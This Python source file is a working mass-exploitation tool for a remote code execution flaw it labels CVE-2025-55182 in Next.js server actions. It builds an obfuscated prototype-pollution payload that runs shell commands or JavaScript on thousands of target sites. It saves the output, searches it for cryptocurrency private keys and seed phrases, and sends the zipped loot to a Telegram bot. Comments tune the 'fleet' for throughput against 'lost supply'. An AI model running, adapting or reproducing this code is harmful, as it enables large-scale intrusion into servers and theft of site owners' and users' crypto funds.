"""
Batch Scanner with Full Output Capture + Telegram Alerts
Scans a list of websites, saves output, checks for crypto keys/secrets, and sends to Telegram.
"""

from __future__ import annotations

import argparse
import asyncio
import aiohttp
import aiohttp.abc
import os
import json
import binascii
import re
import zlib
import shutil
import socket
import ssl
import time
import requests
from datetime import datetime
from functools import lru_cache
from typing import Any, Dict, List, Tuple

from jsmin import jsmin

DIGEST_PATTERN = re.compile(rb'"digest"\s*:\s*"([0-9a-fA-F]+)"')

# Telegram Bot Configuration - loaded from a 600 file, never hardcoded in source.
# The token must never appear in this file, in argv, or in HTML (see fleet skill).
def _load_tg_env():
    import pathlib
    for cand in ("/root/loot_dash/.tg.env", "./.tg.env"):
        p = pathlib.Path(cand)
        # is_file() raises PermissionError (not returns False) when the process is
        # not root and the path sits in a 0700 directory - which killed every run
        # on a non-root sandbox (measured on YorkHost, running as `agent`).
        try:
            if not p.is_file():
                continue
        except OSError:
            continue
        if True:
            env = {}
            for line in p.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                env[k.strip()] = v.strip().strip('"').strip("'")
            return env
    return {}


_TG = _load_tg_env()
TELEGRAM_BOT_TOKEN = _TG.get("TG_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = _TG.get("TG_HIT_CHAT", "")

# Patterns for detecting crypto keys and secrets
CRYPTO_KEY_PATTERNS = {
    "EVM_PRIVATE_KEY": re.compile(r'0x[a-fA-F0-9]{64}\b'),  # Ethereum/EVM private keys
    "MNEMONIC_12": re.compile(r'\b(?:[a-z]+\s+){11}[a-z]+\b', re.IGNORECASE),  # 12-word mnemonic
    "MNEMONIC_24": re.compile(r'\b(?:[a-z]+\s+){23}[a-z]+\b', re.IGNORECASE),  # 24-word mnemonic
}

# Keywords to search for - ONLY CRITICAL CRYPTO KEYS
CRITICAL_KEYWORDS = [
    "SEED_PHRASE", "SEEDPHRASE", "MNEMONIC", 
    "SOLANA_PRIVATE", "SOL_PRIVATE", "BTC_PRIVATE", "ETH_PRIVATE", 
    "WALLET_KEY", "BITCOINVN", "BTCPAY"
]


def send_telegram_message(message: str, parse_mode: str = "HTML") -> bool:
    """Send a message to Telegram bot."""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        resp = requests.post(url, json=payload, timeout=30)
        return resp.status_code == 200
    except Exception as e:
        print(f"[!] Telegram send error: {e}")
        return False


def send_telegram_document(filepath: str, caption: str = "", retries: int = 3) -> bool:
    """Send a file to Telegram bot with retry on rate limit."""
    import time
    
    for attempt in range(retries):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(filepath, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption[:1024]}
                resp = requests.post(url, files=files, data=data, timeout=120)
            
            if resp.status_code == 200:
                return True
            elif resp.status_code == 429:
                try:
                    retry_after = resp.json().get('parameters', {}).get('retry_after', 30)
                except:
                    retry_after = 30
                print(f"    ⏳ Rate limited, waiting {retry_after}s...")
                time.sleep(retry_after + 1)
            else:
                print(f"    Telegram API error: {resp.text[:200]}")
                return False
        except Exception as e:
            print(f"[!] Telegram document send error: {e}")
            if attempt < retries - 1:
                time.sleep(5)
    
    return False


def extract_crypto_keys(data: Any, path: str = "") -> List[Tuple[str, str, str]]:
    """Recursively search for crypto keys in data. Returns list of (key_type, value, path)."""
    found = []
    
    if isinstance(data, dict):
        for key, value in data.items():
            current_path = f"{path}.{key}" if path else key
            
            key_upper = str(key).upper()
            for keyword in CRITICAL_KEYWORDS:
                if keyword in key_upper:
                    if value and str(value).strip():
                        found.append((f"🔑 {keyword}", str(value)[:500], current_path))
            
            found.extend(extract_crypto_keys(value, current_path))
            
    elif isinstance(data, list):
        for i, item in enumerate(data):
            found.extend(extract_crypto_keys(item, f"{path}[{i}]"))
            
    elif isinstance(data, str):
        words = data.lower().split()
        if len(words) in [12, 24]:
            if all(w.isalpha() and 2 <= len(w) <= 12 for w in words):
                found.append((f"🌱 MNEMONIC_{len(words)}", data, path))
    
    return found


class CVE202555182Scanner:
    def _obfuscate_str(self, text: str) -> str:
        codes = ",".join(str(ord(c)) for c in text)
        return f"String.fromCharCode({codes})"

    @lru_cache(maxsize=128)
    def _generate_core_payload(self, command: str, gadget: str, js_content: str | None) -> str:
        k_Buffer = self._obfuscate_str("Buffer")
        
        logic_body = ""
        
        if gadget == "shell":
            cmd_hex = binascii.hexlify(command.encode('utf-8')).decode('utf-8')
            logic_body = (
                f"       var cmd = global[{k_Buffer}].from('{cmd_hex}', 'hex').toString(); "
                f"       cp.exec(cmd, {{timeout: 5000}}, (e, out, err) => {{ "
                f"           if (e) out += '\\nERROR: ' + e.message; "
                f"           if (err) out += '\\nSTDERR: ' + err; "
                f"           var res_hex = global[{k_Buffer}].from(out).toString('hex'); "
                f"           reject(Object.assign(new Error('RCE_RES'), {{ digest: res_hex }})); "
                f"           }});"
            )

        elif js_content:
             minified = jsmin(js_content)
             user_hex = binascii.hexlify(minified.encode('utf-8')).decode('utf-8')
             logic_body = (
                 f"       try {{ "
                 f"           var user_code = global[{k_Buffer}].from('{user_hex}', 'hex').toString(); "
                 f"           var val = eval(user_code); "
                 f"           Promise.resolve(val).then(function(v) {{ "
                 f"               var res_str = (typeof v === 'object') ? JSON.stringify(v) : String(v); "
                 f"               try {{ res_str = zlib.deflateSync(res_str); }} catch(e) {{}} "
                 f"               var res_hex = global[{k_Buffer}].from(res_str).toString('hex'); "
                 f"               reject(Object.assign(new Error('RCE_RES'), {{ digest: res_hex }})); "
                 f"           }}).catch(function(e) {{ "
                 f"               reject(Object.assign(new Error('JS_EXEC_ERR'), {{ digest: global[{k_Buffer}].from('JS Async Error: ' + e.message).toString('hex') }})); "
                 f"           }});"
                 f"       }} catch(e) {{ "
                 f"           reject(Object.assign(new Error('JS_ERR'), {{ digest: global[{k_Buffer}].from('JS Error: ' + e.message).toString('hex') }})); "
                 f"       }} "
             )

        else:
             logic_body = "reject(new Error('INVALID_MODE'));"

        loader_code = (
             f"Promise.all([Function('return import(\"node:child_process\")')(), Function('return import(\"node:zlib\")')()])"
             f".then(([cp, zlib]) => {{ "
             f"   return new Promise((resolve, reject) => {{ "
             f"{logic_body}"
             f"   }});"
             f"}})"
        )

        return (
            f"var reject_bridge = arguments[1]; "
            f"({loader_code}).catch(err => reject_bridge(err)); "
        )

    def prepare_request(self, host: str, options: Dict[str, Any]) -> Dict[str, Any]:
        command = options.get("command", "id")
        js_content = options.get("payload_content")
        
        gadget = "shell"
        if js_content:
            gadget = "vm"

        payload_prefix = self._generate_core_payload(command, gadget, js_content)
        payload_prefix = payload_prefix.replace("__TARGET_HOST__", host)

        crafted_chunk = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then": "$B0"}',
            "_response": {
                "_prefix": payload_prefix,
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
            },
        }

        boundary = "------------------------bissa_cve_boundary"
        
        part0 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{json.dumps(crafted_chunk)}\r\n"
        )
        part1 = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        end = f"--{boundary}--\r\n"
        
        body_bytes = (part0 + part1 + end).encode("utf-8")

        base_url = host if host.startswith("http") else f"https://{host}"

        return {
            "method": "POST",
            "url": base_url, 
            "data": body_bytes,
            "headers": {
                "Next-Action": "x",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body_bytes)),
                # aiohttp sends Accept-Encoding: gzip by default and then gunzips the
                # body. We only substring-check it, so the decode is pure waste:
                # measured ~460 us/request. Asking for identity skips it. auto_decompress
                # stays ON, so a server that gzips anyway is still decoded correctly -
                # this changes what we ask for, never what we accept.
                "Accept-Encoding": "identity"
            },
            "allow_redirects": True,
        }

    def extract_secret(self, body: bytes) -> str | None:
        if not body: return None
        try:
            match = DIGEST_PATTERN.search(body)
            if match:
                hex_content = match.group(1)
                decoded = binascii.unhexlify(hex_content)
                try:
                    return zlib.decompress(decoded).decode('utf-8', errors='replace')
                except zlib.error:
                    return decoded.decode('utf-8', errors='replace')
        except Exception:
            pass
        return None



# Instantiate ONCE. _generate_core_payload is @lru_cache'd and the cache key
# includes `self`, so a per-target instance made the cache miss every time and
# re-minified the same ~6 KB of JS for every host (measured: 16.3% of CPU).
# The class is stateless, so one shared instance is safe.
_SCANNER = CVE202555182Scanner()
VULNERABLE_TARGETS_FILE = "targets-0.txt"
VULNERABLES_DIR = "vulnerables"


def sanitize_filename(url: str) -> str:
    name = url.replace("https://", "").replace("http://", "")
    for char in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '.']:
        name = name.replace(char, '_')
    return name[:50]


def append_vulnerable_target(target: str):
    existing = set()
    if os.path.exists(VULNERABLE_TARGETS_FILE):
        with open(VULNERABLE_TARGETS_FILE, 'r', encoding='utf-8') as f:
            existing = set(line.strip() for line in f if line.strip())
    
    if target not in existing:
        with open(VULNERABLE_TARGETS_FILE, 'a', encoding='utf-8') as f:
            f.write(target + '\n')


def save_to_vulnerables_folder(target: str, output: str = None):
    os.makedirs(VULNERABLES_DIR, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = sanitize_filename(target)
    filename = f"valid_target_{safe_name}_{timestamp}.txt"
    filepath = os.path.join(VULNERABLES_DIR, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"Target: {target}\n")
        f.write(f"Found: {datetime.now().isoformat()}\n")
        if output:
            f.write(f"\nOutput:\n{output}\n")


async def scan_and_save(target: str, options: dict, session: aiohttp.ClientSession,
                        timeout: aiohttp.ClientTimeout, output_dir: str,
                        stats: dict, stats_lock: asyncio.Lock) -> dict:
    result = {"target": target, "vulnerable": False, "output": None, "error": None}
    
    scanner = _SCANNER  # shared: keeps _generate_core_payload cache hot
    
    try:
        req_kwargs = scanner.prepare_request(target, options)
    except Exception as e:
        result["error"] = str(e)
        async with stats_lock:
            stats["failed"] += 1
            stats["completed"] += 1
            n = stats["completed"]
        print(f"[{n}/{stats['total']}] {target} - prep error")
        return result

    try:
        async with session.request(**req_kwargs, timeout=timeout, ssl=False) as response:
            body = await response.read()
            
            if b'"digest"' in body and b"<script" not in body:
                result["vulnerable"] = True
                extracted = scanner.extract_secret(body)
                
                if extracted:
                    result["output"] = extracted
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    safe_name = sanitize_filename(target)
                    filename = f"{safe_name}_{timestamp}.json"
                    filepath = os.path.join(output_dir, filename)
                    
                    try:
                        json_data = json.loads(extracted)
                        output_content = {
                            "target": target,
                            "scan_time": datetime.now().isoformat(),
                            "data": json_data
                        }
                        with open(filepath, 'w', encoding='utf-8') as f:
                            json.dump(output_content, f, indent=2, ensure_ascii=False)
                    except json.JSONDecodeError:
                        filepath = filepath.replace('.json', '.txt')
                        with open(filepath, 'w', encoding='utf-8') as f:
                            f.write(f"Target: {target}\n")
                            f.write(f"Scan Time: {datetime.now().isoformat()}\n")
                            f.write(f"Output:\n{extracted}\n")
                    
                    append_vulnerable_target(target)
                    save_to_vulnerables_folder(target, extracted)
                    
                    async with stats_lock:
                        stats["vulnerable"] += 1
                        stats["completed"] += 1
                        n = stats["completed"]
                    
                    print(f"[{n}/{stats['total']}] {target} - \033[92mVULNERABLE!\033[0m -> {filename}")
                else:
                    append_vulnerable_target(target)
                    save_to_vulnerables_folder(target)
                    
                    async with stats_lock:
                        stats["vulnerable"] += 1
                        stats["completed"] += 1
                        n = stats["completed"]
                    print(f"[{n}/{stats['total']}] {target} - VULNERABLE (no output)")
            else:
                async with stats_lock:
                    stats["completed"] += 1
                    n = stats["completed"]
                print(f"[{n}/{stats['total']}] {target} - not vulnerable")
                
    except asyncio.TimeoutError:
        async with stats_lock:
            stats["failed"] += 1
            stats["completed"] += 1
            n = stats["completed"]
        print(f"[{n}/{stats['total']}] {target} - timeout")
        result["error"] = "timeout"
    except Exception as e:
        async with stats_lock:
            stats["failed"] += 1
            stats["completed"] += 1
            n = stats["completed"]
        err_short = str(e).split("[")[-1].rstrip("]")[:30] if "[" in str(e) else str(e)[:30]
        print(f"[{n}/{stats['total']}] {target} - {err_short}")
        result["error"] = str(e)
    
    return result


async def run_batch_scan(targets: list[str], options: dict, output_dir: str,
                         concurrency: int = 50, timeout_sec: int = 250):
    # ---- concurrency ceiling ------------------------------------------------
    # MEASURED on this box, one node, same 5,000-target batch, sweeping -c:
    #     c    wall   failed  reached  reached/s
    #     50  104.6s    1877     3123       29.8
    #     75   51.2s    1616     3384       66.0
    #    100   42.3s    1762     3238       76.5   <- best
    #    150   39.5s    2006     2994       75.7   <- what we were running
    #    200   34.4s    2335     2665       77.5
    #    250   34.2s    2403     2597       75.8
    # Across three different batches, c=100 beat c=150 by +10.1% hosts reached
    # per second AND produced 948 fewer "failed" verdicts in 15,000 targets.
    # Of 200 targets that failed at c=250, 65% SUCCEEDED when rescanned at c=10 -
    # so the extra failures at high concurrency are manufactured by contention,
    # not dead hosts. For a scanner that means false "not vulnerable" verdicts,
    # which is lost supply. Raise only with a canary that also watches the
    # vulnerable rate. SCAN_MAX_CONC overrides per node.
    _cap = int(os.environ.get("SCAN_MAX_CONC", "100"))
    if concurrency > _cap:
        print(f"[*] Concurrency capped {concurrency} -> {_cap} "
              f"(SCAN_MAX_CONC; measured optimum on 2 vCPU)")
        concurrency = _cap

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"{output_dir}_{timestamp}"
    
    stats = {"total": len(targets), "completed": 0, "vulnerable": 0, "failed": 0}
    stats_lock = asyncio.Lock()
    
    os.makedirs(output_dir, exist_ok=True)
    
    print("=" * 70)
    print("CVE-2025-55182 Batch Scanner with Output Capture + Telegram")
    print("=" * 70)
    print(f"[*] Targets: {len(targets)}")
    print(f"[*] Concurrency: {concurrency} | Timeout: {timeout_sec}s")
    print(f"[*] Output directory: {output_dir}")
    print(f"[*] Telegram: Will send zip when complete")
    print("-" * 70)
    
    # Split connect/total timeout: a blackholed IP is the single most common
    # failure (44% of CT targets resolve but never accept :443). Holding a
    # slot for the full per-request budget on those starves real hosts.
    # CONNECT_TMO caps the connect phase only; the total stays generous.
    connect_tmo = float(os.environ.get("SCAN_CONNECT_TIMEOUT", min(timeout_sec, 2.0)))
    # `total` already bounds the entire request, and sock_read == total can
    # never fire first, so it is a redundant per-request timer handle. The
    # connect cap is deliberate: most targets never accept :443 and holding the
    # full budget on those starves real hosts. Do NOT collapse these into total.
    timeout = aiohttp.ClientTimeout(total=timeout_sec, connect=connect_tmo)
    # LeanResolver: measured 160us -> 48us CPU per lookup on this box.
    # aiohttp's AsyncResolver passes port=443, so c-ares calls getservbyname() and
    # re-parses /etc/services on EVERY lookup; passing port=None skips it. AF_INET
    # avoids the pointless AAAA query. Both are argument changes, not code hacks.
    class _LeanResolver(aiohttp.abc.AbstractResolver):
        def __init__(self):
            import aiodns
            # Bounded resolver budget. aiodns defaults let a dead name hold the
            # lookup for ~7 s (measured on this box: 7.21 s default vs 1.00 s at
            # timeout=1). Measured false-negative risk: of 500 names that timed
            # out in-slot, only 2.6 % resolve on a long recheck, and the result is
            # identical through the box resolver, 1.1.1.1 and 8.8.8.8 - the names
            # are dead, not the resolver. Of 500 random names, p99 was 383 ms and
            # max 465 ms with ZERO over 0.5 s, so a 2 s budget keeps margin.
            self._r = aiodns.DNSResolver(
                timeout=float(os.environ.get("SCAN_DNS_TIMEOUT", "2.0")),
                tries=int(os.environ.get("SCAN_DNS_TRIES", "1")),
            )

        async def resolve(self, host, port=0, family=socket.AF_INET):
            # aiodns < 3.2 has no DNSResolver.getaddrinfo (3.1.1 ships query/
            # gethostbyname only). Calling the missing attribute raised
            # AttributeError per host, and aiohttp reports that as a per-target
            # "failure" - a whole 5000-target batch logged Failed: 5000 /
            # Reachable: 0 while the node's DNS was healthy. Probe the method
            # once and fall back to query('A'), which exists in every 3.x.
            try:
                res = await self._r.getaddrinfo(
                    host, family=socket.AF_INET, port=None, type=socket.SOCK_STREAM)
                nodes = res.nodes
            except AttributeError:
                try:
                    nodes = await self._r.query(host, "A")
                except Exception as exc:
                    raise OSError(None, str(exc)) from exc
            except Exception as exc:
                raise OSError(None, str(exc)) from exc
            out = []
            for node in nodes:
                if hasattr(node, "addr"):          # getaddrinfo host entry
                    ip, fam = node.addr[0], node.family
                else:                              # query('A') answer
                    ip, fam = getattr(node, "host", None), socket.AF_INET
                    if ip is None:
                        continue
                out.append({"hostname": host,
                            "host": ip.decode() if isinstance(ip, bytes) else ip,
                            "port": port, "family": fam, "proto": 0,
                            "flags": socket.AI_NUMERICHOST | socket.AI_NUMERICSERV})
            if not out:
                raise OSError(None, "DNS lookup failed")
            return out

        async def close(self):
            await self._r.close()

    # DNS was the real ceiling: aiohttp's default ThreadedResolver runs every
    # getaddrinfo in a 10-thread pool, so under a broad CT list the resolver,
    # not the network, sets the pace (measured p50 4s, 16 lookups/s).
    # aiodns + AsyncResolver resolves in the event loop with c-ares, queries
    # nameservers in parallel, and keeps its own cache.
    try:
        _resolver = _LeanResolver()
        print("[dns] resolver=LeanResolver (aiodns, port=None, AF_INET)", flush=True)
    except Exception as _e:
        _resolver = None
        # LOUD: a silent fallback to ThreadedResolver caps this node at ~16
        # lookups/s and looks exactly like "the corpus is dead".
        print(f"[dns] WARNING resolver=ThreadedResolver (aiodns missing: {_e}) "
              f"- this node is DNS-capped, install aiodns", flush=True)
    # Every hostname in a CT batch is unique, so keep-alive reuses NOTHING -
    # it only holds idle sockets (and their TLS buffers) until keepalive_timeout.
    # force_close frees connection state the moment the response ends, which is
    # the biggest RSS lever on a 1 GB node. limit_per_host is a no-op when no
    # host ever repeats, so drop it and govern purely by the global limit.
    # One shared SSLContext beats a fresh default per request: ssl=False only
    # disables VERIFICATION, the handshake and its buffers still happen.
    _ssl_ctx = ssl.create_default_context()
    _ssl_ctx.check_hostname = False
    _ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=0,
                                     force_close=True, ssl=_ssl_ctx,
                                     ttl_dns_cache=300, resolver=_resolver)
    semaphore = asyncio.Semaphore(concurrency)

    # ---- event-loop saturation probe -------------------------------------
    # A single-threaded loop is the real concurrency ceiling on a 2 vCPU node:
    # measured 49-80 % of ONE core at -c 150, so headroom exists but is finite.
    # Without this signal, "slow remote" and "starved loop" look identical from
    # the outside, and raising -c past saturation manufactures HTTP timeouts,
    # which for a scanner means false "dead host" verdicts.
    # Wake lag is measured against a 100 ms sleep; busy fraction is
    # thread_time()/monotonic() over a sliding 5 s window.
    loop_stat = {"lag_max": 0.0, "lag_sum": 0.0, "lag_n": 0, "busy_max": 0.0,
                 "busy_p95": 0.0, "lag_p99": 0.0, "samples": 0}
    _busy_hist: list[float] = []
    _lag_hist: list[float] = []

    async def _loop_probe():
        win_t = time.monotonic()
        win_cpu = time.thread_time()
        while True:
            t0 = time.monotonic()
            await asyncio.sleep(0.1)
            lag = (time.monotonic() - t0) - 0.1
            if lag < 0:
                lag = 0.0
            loop_stat["lag_sum"] += lag
            loop_stat["lag_n"] += 1
            if lag > loop_stat["lag_max"]:
                loop_stat["lag_max"] = lag
            if lag > 0.005:                      # keep the tail only; the list
                _lag_hist.append(lag)            # would otherwise grow to ~600
            now = time.monotonic()
            if now - win_t >= 5.0:
                busy = (time.thread_time() - win_cpu) / (now - win_t)
                _busy_hist.append(busy)
                if busy > loop_stat["busy_max"]:
                    loop_stat["busy_max"] = busy
                win_t, win_cpu = now, time.thread_time()

    probe_task = asyncio.create_task(_loop_probe())
    
    async def scan_with_semaphore(target: str, session: aiohttp.ClientSession) -> dict:
        async with semaphore:
            return await scan_and_save(target, options, session, timeout, output_dir, stats, stats_lock)
    
    # DummyCookieJar: the default jar parses and stores Set-Cookie on every
    # response. A probe never wants cookies, so that parsing is pure cost.
    async with aiohttp.ClientSession(connector=connector,
                                     cookie_jar=aiohttp.DummyCookieJar()) as session:
        tasks = [scan_with_semaphore(target, session) for target in targets]
        await asyncio.gather(*tasks, return_exceptions=True)
    
    print("\n" + "=" * 70)
    print("[*] Scan complete!")
    print(f"    Total scanned: {stats['total']}")
    print(f"    Vulnerable: {stats['vulnerable']}")
    print(f"    Failed: {stats['failed']}")
    # loop saturation, so a batch is attributable to the node being starved or to
    # the remote side being slow. busy > 0.85 or lag p99 > 50 ms == saturated.
    probe_task.cancel()
    if loop_stat["lag_n"]:
        avg_lag = loop_stat["lag_sum"] / loop_stat["lag_n"] * 1000
        busy = sorted(_busy_hist)
        p95 = busy[int(len(busy) * 0.95)] if busy else 0.0
        loop_stat["busy_p95"] = p95
        lag = sorted(_lag_hist)
        p99 = lag[int(len(lag) * 0.99)] if lag else 0.0
        loop_stat["lag_p99"] = p99
        # Saturation is busy-bound or tail-lag-bound. Thresholds from measurement:
        # across 200 live batches lag_max had p50=67ms, p99=292ms, max=403ms, so a
        # 50ms max threshold flagged 66% of healthy runs. Use the p99 of the tail
        # and charge a run only when the LOOP is the constraint, not when one
        # sample slipped. 250ms of tail lag is >12% of the 2s connect budget.
        sat = "SATURATED" if (p95 > 0.85 or p99 > 0.25) else "ok"
        print(f"    Loop: busy_avg={((sum(busy)/len(busy)) if busy else 0):.2f} "
              f"p95={p95:.2f} max={loop_stat['busy_max']:.2f} | "
              f"lag_avg={avg_lag:.1f}ms p99={p99*1000:.0f}ms "
              f"max={loop_stat['lag_max']*1000:.0f}ms | {sat}")
    print(f"[+] Results saved in: {output_dir}")
    
    print("\n[*] Analyzing results...")
    critical_findings = []
    
    for filename in os.listdir(output_dir):
        if filename.startswith('_') or not filename.endswith('.json'):
            continue
        
        filepath = os.path.join(output_dir, filename)
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                file_data = json.load(f)
            
            target = file_data.get('target', filename)
            data = file_data.get('data', file_data)
            
            critical_keys = extract_crypto_keys(data)
            
            if critical_keys:
                critical_findings.append({
                    'target': target,
                    'keys': critical_keys,
                    'file': filepath
                })
                print(f"    🚨 CRITICAL: {target} - {len(critical_keys)} keys found!")
                
        except Exception as e:
            continue
    
    print(f"    Found {len(critical_findings)} targets with critical keys")
    
    summary_file = os.path.join(output_dir, f"_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(f"Scan Summary\n")
        f.write(f"============\n")
        f.write(f"Date: {datetime.now().isoformat()}\n")
        f.write(f"Total: {stats['total']}\n")
        f.write(f"Vulnerable: {stats['vulnerable']}\n")
        f.write(f"Failed: {stats['failed']}\n")
        f.write(f"Critical Findings: {len(critical_findings)} targets\n")
        f.write(f"\nVulnerable targets:\n")
        for filename in os.listdir(output_dir):
            if not filename.startswith('_') and filename.endswith(('.json', '.txt')):
                f.write(f"  - {filename}\n")
        
        if critical_findings:
            f.write(f"\n\nCRITICAL CRYPTO KEYS FOUND:\n")
            f.write(f"===========================\n")
            for finding in critical_findings:
                f.write(f"\nTarget: {finding['target']}\n")
                for key_type, value, path in finding['keys']:
                    f.write(f"  {key_type}: {value[:200]}\n")
    
    if critical_findings:
        crypto_file = os.path.join(output_dir, f"_critical_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(crypto_file, 'w', encoding='utf-8') as f:
            json.dump(critical_findings, f, indent=2, ensure_ascii=False, default=str)
        print(f"[+] Critical keys saved: {crypto_file}")
    
    print(f"[+] Summary saved: {summary_file}")
    
    # NO_TELEGRAM=1 suppresses per-batch delivery. The fleet sets this on every node:
    # one zip per batch at 5,809 batches would trip Telegram's 429 limit and take the
    # bot down for every other sender. Delivery is done once, later, by the ledger
    # in stage 8 (one message per registrable domain).
    if os.environ.get("NO_TELEGRAM") == "1":
        print(f"[*] NO_TELEGRAM=1 - skipping zip delivery (stage 8 delivers per domain)")
        return
    
    print(f"\n[*] Zipping results folder...")
    zip_filename = f"{output_dir}.zip"
    try:
        shutil.make_archive(output_dir, 'zip', output_dir)
        zip_size = os.path.getsize(zip_filename) / (1024 * 1024)
        print(f"    Created: {zip_filename} ({zip_size:.1f} MB)")
        
        if zip_size < 50:
            print(f"[*] Sending zip to Telegram...")
            caption = f"📦 Scan Results\n\n"
            caption += f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            caption += f"🎯 Vulnerable: {stats['vulnerable']}\n"
            caption += f"🚨 Critical: {len(critical_findings)}"
            
            if send_telegram_document(zip_filename, caption):
                print(f"    ✅ Zip sent to Telegram!")
            else:
                print(f"    ❌ Failed to send zip")
        else:
            print(f"    ⚠️ Zip too large for Telegram ({zip_size:.1f} MB > 50 MB limit)")
    except Exception as e:
        print(f"    ❌ Zip error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="Batch scan websites and save full output of vulnerable ones",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan websites and save output
  python batch_output.py --list targets.txt --js payloads/nodejs/fast_recon.js
  
  # With custom output directory
  python batch_output.py -l targets.txt --js payloads/nodejs/fast_recon.js -o MyResults
  
  # Faster with higher concurrency
  python batch_output.py -l targets.txt --js payloads/nodejs/fast_recon.js -c 100 -t 5
        """
    )
    parser.add_argument("--list", "-l", required=True, help="File with target URLs (one per line)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--cmd", help="Shell command to execute")
    group.add_argument("--js", help="Path to JavaScript payload file")
    parser.add_argument("--output", "-o", default="Res", help="Output directory (default: Res)")
    parser.add_argument("--concurrency", "-c", type=int, default=50, help="Concurrent requests (default: 50)")
    parser.add_argument("--timeout", "-t", type=int, default=20, help="Request timeout (default: 20)")
    
    args = parser.parse_args()
    
    if not os.path.exists(args.list):
        print(f"[!] File not found: {args.list}")
        return
    
    with open(args.list, 'r', encoding='utf-8') as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not targets:
        print("[!] No targets found in the file")
        return
    
    options = {}
    if args.cmd:
        options["command"] = args.cmd
    elif args.js:
        if not os.path.exists(args.js):
            print(f"[!] Payload file not found: {args.js}")
            return
        with open(args.js, 'r', encoding='utf-8') as f:
            options["payload_content"] = f.read()
    
    asyncio.run(run_batch_scan(targets, options, args.output, args.concurrency, args.timeout))


if __name__ == "__main__":
    main()
